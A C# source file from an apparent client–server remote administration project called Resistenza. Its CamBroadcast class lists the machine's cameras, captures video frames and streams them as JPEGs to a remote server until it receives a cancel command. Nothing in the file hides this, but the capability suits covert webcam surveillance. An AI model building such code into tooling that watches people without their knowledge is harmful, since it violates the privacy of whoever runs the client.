using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using Resistenza.Common.Networking;
using System.Management;
using AForge.Video;
using AForge.Video.DirectShow;
using Resistenza.Common.Tools;


using System.Drawing.Imaging;
using System.Drawing;
using NAudio.Wave;
using System.Diagnostics;

using Resistenza.Common.Packets.Logic;
using Resistenza.Client.Logic;
using System.Drawing.Printing;

namespace Resistenza.Common.Packets.Camera
{
    public class CamBroadcast
    {
        public CamBroadcast(SecureStream Server, SemaphoreSlim Lock)
        {

            _ServerStrem = Server;
            _Lock = Lock;
            
            
        }

        private SecureStream _ServerStrem;
        private VideoCaptureDevice _VideoCaptureDevice;
        private SemaphoreSlim _Lock;
        
       


        
      


        public static List<string> GetDevicesNames() { 

            var cameraNames = new List<string>();
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
            {
                foreach (var device in searcher.Get())
                {
                    cameraNames.Add(device["Caption"].ToString());
                }
            }

            return cameraNames;
        }

        public async Task StartStreaming(string DeviceName, CancellationTokenSourceWithId CancelOperation)
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            string MonikerString = string.Empty;
            
            foreach (FilterInfo DeviceInfo in videoDevices)
            {
                if (DeviceInfo.Name == DeviceName)
                {
                    MonikerString = DeviceInfo.MonikerString; 
                    
                    break;

                }
            }


            _VideoCaptureDevice = new VideoCaptureDevice(MonikerString);
            _VideoCaptureDevice.NewFrame += OnNewFrame;
           
            _VideoCaptureDevice.Start();

            while (!(CancelOperation.IsCancellationRequested && (CancelOperation.IdOfTaskToBeCancelled == TasksIds.STREAM_VIDEO_TASK_ID || CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS)))
            {
                await Task.Delay(100);
            }

            _VideoCaptureDevice.SignalToStop();
            _VideoCaptureDevice.WaitForStop();

            
            CancelOperation.Token.ThrowIfCancellationRequested();
            
            

        }

        private async void OnNewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            CamFrameResponse Frame = new CamFrameResponse()
            {
                Data = ConvertFrameToByteArray(eventArgs.Frame)
            };

            await _Lock.WaitAsync();
            bool Res = await _ServerStrem.SendPacketAsync(Frame);
            _Lock.Release();
            
            
            
        }

        private byte[] ConvertFrameToByteArray(Bitmap Frame)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                Frame.Save(stream, ImageFormat.Jpeg);
                return stream.ToArray();    
            }
        }
    }

    
}
